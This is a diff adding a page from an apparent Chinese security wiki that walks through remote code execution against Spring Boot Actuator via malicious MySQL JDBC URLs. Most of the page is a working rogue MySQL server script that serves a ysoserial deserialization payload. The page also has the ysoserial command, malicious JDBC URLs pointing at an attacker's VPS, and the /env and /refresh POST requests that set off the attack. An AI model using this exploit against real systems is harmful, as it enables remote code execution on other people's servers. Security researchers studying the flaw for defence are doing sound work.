@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Spring%20Boot/Spring%20Boot%20mysql%20jdbc%20deserialization%20rce/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Spring Boot mysql jdbc deserialization rce - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Spring Boot mysql jdbc deserialization rce", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_3" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Spring%20Boot%20sql/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Spring%20Boot%20sql/" class="btn btn-xs btn-link">
+        Spring Boot sql
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Spring%20Boot%20h2%20database%20query%20rce/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Spring%20Boot%20h2%20database%20query%20rce/" class="btn btn-xs btn-link">
+        Spring Boot h2 database query rce
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="spring-boot-mysql-jdbc-deserialization-rce">Spring Boot mysql jdbc deserialization rce<a class="headerlink" href="#spring-boot-mysql-jdbc-deserialization-rce" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h4 id="_2">利用条件：<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
+<ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在
+    <code>spring-boot-starter-actuator</code> 依赖）</li>
+<li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li>
+<li>目标可以请求攻击者的服务器（请求可出外网）</li>
+</ul>
+<h2 id="_3">二、漏洞影响<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h2 id="_4">三、复现过程<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<h3 id="_5">漏洞分析<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<ol>
+<li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li>
+<li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li>
+<li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url
+    建立新的数据库连接</li>
+<li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload
+    数据</li>
+<li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成
+    RCE 漏洞</li>
+</ol>
+<h3 id="_6">漏洞复现<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<h5 id="_7">步骤一：查看环境依赖<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h5>
+<p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有
+<code>mysql-connector-java</code> 关键词，并记录下其版本号（5.x 或 8.x）；</p>
+<p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如
+<code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p>
+<p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code>
+值，方便后续恢复其正常 jdbc url 值。</p>
+<h5 id="rogue-mysql-server">步骤二：架设恶意 rogue mysql server<a class="headerlink" href="#rogue-mysql-server" title="Permanent link">&para;</a></h5>
+<p>在自己控制的服务器上运行springboot-jdbc-deserialization-rce.py脚本，并使用ysoserial自定义要执行的命令：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">springboot</span><span class="o">-</span><span class="n">jdbc</span><span class="o">-</span><span class="n">deserialization</span><span class="o">-</span><span class="n">rce</span><span class="o">.</span><span class="n">py</span>
+<span class="c1">#!/usr/bin/env python</span>
+<span class="c1"># coding: utf-8</span>
+<span class="c1"># -**- Author: LandGrey -**-</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">binascii</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">server_send</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">count</span>
+    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Package order: </span><span class="si">{}</span><span class="s2">, Send: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="n">payload</span><span class="p">))</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">server_receive</span><span class="p">(</span><span class="n">conn</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">count</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span>
+
+    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">BUFFER_SIZE</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Package order: </span><span class="si">{}</span><span class="s2">, Receive: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">run_mysql_server</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">count</span><span class="p">,</span> <span class="n">deserialization_payload</span>
+
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">server_socks</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Connection from client -&gt; </span><span class="si">{}</span><span class="s2">:</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+        <span class="n">greeting</span> <span class="o">=</span> <span class="s1">&#39;4a0000000a352e372e323900160000006c7a5d420d107a7700ffff080200ffc11500000000000000000000566d1a0a796d3e1338313747006d7973716c5f6e61746976655f70617373776f726400&#39;</span>
+        <span class="n">server_send</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">greeting</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">deserialization_file</span><span class="p">):</span>
+            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">deserialization_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">_f</span><span class="p">:</span>
+                <span class="n">deserialization_payload</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">_f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+            <span class="c1"># client auth</span>
+            <span class="n">server_receive</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="n">server_send</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">response_ok</span><span class="p">)</span>
+
+            <span class="c1"># client query</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">server_receive</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s2">&quot;session.auto_increment_increment&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+                <span class="n">_payload</span> <span class="o">=</span> <span class="s1">&#39;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c210009000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f90000150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013007343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e035554430653595354454d0f52455045415441424c452d5245414405323838303007000016fe000002000200&#39;</span>
+                <span class="n">server_send</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">_payload</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">server_receive</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s2">&quot;show warnings&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+                <span class="n">_payload</span> <span class="o">=</span> <span class="s1">&#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#39;</span>
+                <span class="n">server_send</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">_payload</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">server_receive</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s2">&quot;set names&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+                <span class="n">server_send</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">response_ok</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">server_receive</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s2">&quot;set character_set_results&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+                <span class="n">server_send</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">response_ok</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">server_receive</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s2">&quot;show session status&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+                <span class="n">_data</span> <span class="o">=</span> <span class="s1">&#39;0100000102&#39;</span>
+                <span class="n">_data</span> <span class="o">+=</span> <span class="s1">&#39;2700000203646566056365736869046f626a73046f626a730269640269640c3f000b000000030000000000&#39;</span>
+                <span class="n">_data</span> <span class="o">+=</span> <span class="s1">&#39;2900000303646566056365736869046f626a73046f626a73036f626a036f626a0c3f00ffff0000fc9000000000&#39;</span>
+                <span class="n">_payload_hex</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">deserialization_payload</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+                <span class="n">_payload_length</span> <span class="o">=</span> <span class="n">_payload_hex</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">_payload_hex</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
+                <span class="n">_data_hex</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">deserialization_payload</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">5</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+                <span class="n">_data_lenght</span> <span class="o">=</span> <span class="n">_data_hex</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="n">_data_hex</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">_data_hex</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
+                <span class="n">_data</span> <span class="o">+=</span> <span class="n">_data_lenght</span> <span class="o">+</span> <span class="s1">&#39;04&#39;</span> <span class="o">+</span> <span class="s1">&#39;0131fc&#39;</span> <span class="o">+</span> <span class="n">_payload_length</span> <span class="o">+</span> <span class="n">deserialization_payload</span>
+                <span class="n">_data</span> <span class="o">+=</span> <span class="s1">&#39;07000005fe000022000100&#39;</span>
+                <span class="n">server_send</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">_data</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">server_receive</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s2">&quot;show warnings&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+                <span class="n">_payload</span> <span class="o">=</span> <span class="s1">&#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#39;</span>
+                <span class="n">server_send</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">_payload</span><span class="p">)</span>
+
+            <span class="k">break</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">pass</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;0.0.0.0&quot;</span>
+    <span class="n">PORT</span> <span class="o">=</span> <span class="mi">3306</span>
+
+    <span class="n">deserialization_file</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;payload.ser&#39;</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">deserialization_file</span><span class="p">):</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">deserialization_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">deserialization_payload</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">deserialization_payload</span> <span class="o">=</span> <span class="s1">&#39;aced****(your deserialized hex data)&#39;</span>
+
+    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">BUFFER_SIZE</span> <span class="o">=</span> <span class="mi">1024</span>
+    <span class="n">response_ok</span> <span class="o">=</span> <span class="s1">&#39;0700000200000002000000&#39;</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] rogue mysql server Listening on </span><span class="si">{}</span><span class="s2">:</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+    <span class="n">server_socks</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">server_socks</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">server_socks</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+    <span class="n">server_socks</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">run_mysql_server</span><span class="p">()</span>
+<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="mf">.0</span><span class="o">-</span><span class="n">sec</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="n">ysoserial</span><span class="o">.</span><span class="n">zip</span>
+<span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">ysoserial</span><span class="o">.</span><span class="n">jar</span> <span class="n">CommonsCollections3</span> <span class="n">calc</span> <span class="o">&gt;</span> <span class="n">payload</span><span class="o">.</span><span class="n">ser</span>
+</code></pre></div>
+
+<p>在脚本**同目录下**生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p>
+<h5 id="springdatasourceurl">步骤三：设置 spring.datasource.url 属性<a class="headerlink" href="#springdatasourceurl" title="Permanent link">&para;</a></h5>
+<blockquote>
+<p>⚠️
+修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p>
+</blockquote>
+<p>mysql-connector-java 5.x 版本设置**属性值**为：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">jdbc</span><span class="o">:</span><span class="n">mysql</span><span class="o">://</span><span class="n">your</span><span class="o">-</span><span class="n">vps</span><span class="o">-</span><span class="n">ip</span><span class="o">:</span><span class="mi">3306</span><span class="o">/</span><span class="n">mysql</span><span class="o">?</span><span class="n">characterEncoding</span><span class="o">=</span><span class="n">utf8</span><span class="o">&amp;</span><span class="n">useSSL</span><span class="o">=</span><span class="kc">false</span><span class="o">&amp;</span><span class="n">statementInterceptors</span><span class="o">=</span><span class="n">com</span><span class="o">.</span><span class="na">mysql</span><span class="o">.</span><span class="na">jdbc</span><span class="o">.</span><span class="na">interceptors</span><span class="o">.</span><span class="na">ServerStatusDiffInterceptor</span><span class="o">&amp;</span><span class="n">autoDeserialize</span><span class="o">=</span><span class="kc">true</span>
+</code></pre></div>
+
+<p>mysql-connector-java 8.x 版本设置**属性值**为：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">jdbc</span><span class="o">:</span><span class="n">mysql</span><span class="o">://</span><span class="n">your</span><span class="o">-</span><span class="n">vps</span><span class="o">-</span><span class="n">ip</span><span class="o">:</span><span class="mi">3306</span><span class="o">/</span><span class="n">mysql</span><span class="o">?</span><span class="n">characterEncoding</span><span class="o">=</span><span class="n">utf8</span><span class="o">&amp;</span><span class="n">useSSL</span><span class="o">=</span><span class="kc">false</span><span class="o">&amp;</span><span class="n">queryInterceptors</span><span class="o">=</span><span class="n">com</span><span class="o">.</span><span class="na">mysql</span><span class="o">.</span><span class="na">cj</span><span class="o">.</span><span class="na">jdbc</span><span class="o">.</span><span class="na">interceptors</span><span class="o">.</span><span class="na">ServerStatusDiffInterceptor</span><span class="o">&amp;</span><span class="n">autoDeserialize</span><span class="o">=</span><span class="kc">true</span>
+</code></pre></div>
+
+<p>spring 1.x</p>
+<div class="codehilite"><pre><span></span><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.datasource.url=对应属性值
+</code></pre></div>
+
+<p>spring 2.x</p>
+<div class="codehilite"><pre><span></span><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;}
+</code></pre></div>
+
+<h5 id="_8">步骤四：刷新配置<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h5>
+<p>spring 1.x</p>
+<div class="codehilite"><pre><span></span><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre></div>
+
+<p>spring 2.x</p>
+<div class="codehilite"><pre><span></span><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre></div>
+
+<h5 id="_9">步骤五：触发数据库查询<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h5>
+<p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code>
+，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>
+<h5 id="jdbc-url">步骤六：恢复正常 jdbc url<a class="headerlink" href="#jdbc-url" title="Permanent link">&para;</a></h5>
+<p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的
+<code>spring.datasource.url</code> 的原始 <code>value</code> 值</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Spring%20Boot%20sql/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Spring%20Boot%20sql/" class="btn btn-xs btn-link">
+        Spring Boot sql
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Spring%20Boot%20h2%20database%20query%20rce/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Spring%20Boot%20h2%20database%20query%20rce/" class="btn btn-xs btn-link">
+        Spring Boot h2 database query rce
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
